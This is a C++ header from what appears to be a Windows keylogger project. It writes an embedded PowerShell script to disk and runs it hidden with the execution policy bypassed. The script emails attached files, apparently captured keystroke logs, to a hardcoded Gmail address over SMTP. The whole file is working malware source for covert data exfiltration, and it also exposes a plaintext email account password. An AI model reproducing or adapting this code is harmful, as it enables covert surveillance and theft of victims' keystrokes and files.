#ifndef SENDMAIL_H
#define SENDMAIL_H
#include <fstream>
#include <vector>
#include "windows.h"
#include "IO.h"
#include "Timer.h"
#include "Helper.h"

#define SCRIPT_NAME "sm.ps1"
namespace Mail
{

    #define X_EM_TO "hackrespoint@gmail.com"
    #define X_EM_FROM "hackrespoint@gmail.com"
    #define X_EM_PASS "team9.Keylogger"

const std::string &PowerShellScript =
"Param( #parameters to our script\r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
"                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
"  ForEach ($val in $Attachments)\r\n                    "
"        {\r\n               "
"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
"}\r\n                catch\r\n                    {\r\n                        exit 2; "
"#attachment not found, or.. dont have permission\r\n                    }\r\n            }\r\n "
"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
"exit 7; #everything went OK\r\n          }\r\n      catch\r\n          {\r\n            exit 3; #error,"
" something went wrong :(\r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
"Send-EMail -attachment $Att "
"-To \"" +
 std::string (X_EM_TO) +
 "\""
" -Body $Body -Subject $Subj "
"-password \"" +
 std::string (X_EM_PASS) +
  "\""
" -From \"" +
 std::string (X_EM_FROM) +
"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; #well, calling the function is wrong? not enough parameters\r\n    }";


    #undef X_EM_FROM
    #undef X_EM_TO
    #undef X_EM_PASS


  std::string StringReplace (std::string s, const std::string &what, const std::string &with) //first parameter string itself, second parameter what to look for
        {                                                                                       //third parameter is what we intend to replace it with
            if(what.empty())
                return s;
            size_t sp = 0;                              //useful for iterating string one position at a time, sp stands for string position.
            while((sp = s.find(what, sp)) != std::string::npos)         //while sp finds what are we looking for and where are we looking it, string::npos is string termination
                s.replace(sp, what.length(), with), sp += with.length(); //with we are replacing with what and we are also increasing the sp count by with length
            return s;
        }
    bool CheckFileExists (const std::string &f)      //Just check if the file exists, if it does it will return true
        {
            std::ifstream file (f);
            return (bool)file;
        }
    bool CreateScript()
        {
            std::ofstream script (IO::GetOurPath(true) + std::string(SCRIPT_NAME));    //we will get the path name and concatenate it with the script name
            if (!script)
                return false;
            script << PowerShellScript;       // We have output-ed the script to the file
            if (!script)
                return false;                 //If anything bad happens, return false and close the script
            script.close();
            return true;
        }
    Timer m_timer;                            //Creating the Mail Timer. Made Global because we need to reuse it again if the sending fails at first time.
    int SendMail (const std::string &subject, const std::string &body, const std::string &attachments)      //contents of e-mail
        {
            bool ok;
            ok  = IO::MkDir(IO::GetOurPath(true));    //Using MKDir from input output stream to create a directory
            if (!ok)
                return -1;
            std::string scr_path = IO::GetOurPath(true) + std::string (SCRIPT_NAME);
            if (!CheckFileExists(scr_path))
                ok = CreateScript();
            if (!ok)
                return -2;

            std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" -Subj \""
                                + StringReplace(subject, "\"", "\\\"") +
                                 "\" -Body \""
                                 + StringReplace(body, "\"", "\\\"") +
                                  "\" -Att \"" + attachments + "\"";

            SHELLEXECUTEINFO ShExecInfo = {0};
            ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);

            //fMask.SEE_MASK_NOCLOSEPROCESS::

            //Use to indicate that the Handle instance(hProcess) member receives the process handle.
            //This handle is typically used to allow an application to find out when a process created with ShellExecuteEx terminates.
            //In some cases, such as when execution is satisfied through a DDE conversation, no handle will be returned.
            //The calling application is responsible for closing the handle when it is no longer needed.

            ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;

            //HWND hwnd::

            //A handle to the parent window, used to display any message boxes that the system might produce while
            //executing this function. This value is NULL as we don't want any window to pop out.

            ShExecInfo.hwnd = NULL;

            //lpVerb::

            //A string, referred to as a verb, that specifies the action to be performed. The set of available verbs depends
            //on the particular file or folder. Generally, the actions available from an object's shortcut menu are available verbs.

            ShExecInfo.lpVerb = "open";

            //lpFile::

            //The address of a null-terminated string that specifies the name of the file or object on which ShellExecuteEx
            //will perform the action specified by the lpVerb parameter.

            ShExecInfo.lpFile = "powershell";

            //lpParameters::

            //The address of a null-terminated string that contains the application parameters.
            //The parameters must be separated by spaces.

            ShExecInfo.lpParameters = param.c_str();

            //lpDirectory::

            //The address of a null-terminated string that specifies the name of the working directory.
            //If this member is NULL, the current directory is used as the working directory.

            ShExecInfo.lpDirectory = NULL;

            //nShow::

            //Flags that specify how an application is to be shown when it is opened

            ShExecInfo.nShow = SW_HIDE;

            //hInstApp::

            //If SEE_MASK_NOCLOSEPROCESS is set and the ShellExecuteEx call succeeds, it sets this member to a value greater than 32.
            //If the function fails, it is set to an SE_ERR_XXX error value that indicates the cause of the failure.

            ShExecInfo.hInstApp = NULL;


            ok = (bool)ShellExecuteEx(&ShExecInfo);
            if (!ok)
                return -3;
            WaitForSingleObject(ShExecInfo.hProcess, 7000);
            DWORD exit_code = 100;                                          //DWORD - The size of this structure, in bytes.
            GetExitCodeProcess (ShExecInfo.hProcess, &exit_code);
            m_timer.SetFunction ([&]()
                     {
                        WaitForSingleObject(ShExecInfo.hProcess, 60000);
                        GetExitCodeProcess (ShExecInfo.hProcess, &exit_code);
                            if ((int)exit_code == STILL_ACTIVE)
                         TerminateProcess(ShExecInfo.hProcess, 100);
                         Helper::WriteAppLog ("<From SendMail> Return code: " + Helper::ToString ((int)exit_code));
                     });
            m_timer.RepeatCount (1L);
            m_timer.SetInterval (10L);
            m_timer.Start (true);
            return (int)exit_code;
        }
    int SendMail (const std::string &subject, const std::string &body, const std::vector<std::string> &att)

    //This function is called when there are multiple attachments to the file.
        {
            std::string attachments = "";
            if (att.size() == 1U)
                attachments = att.at(0);

            for (const auto &v : att)
                attachments += v + "::";
            attachments = attachments.substr (0, attachments.length() - 2);
            return SendMail(subject, body, attachments);
        }
}
#endif

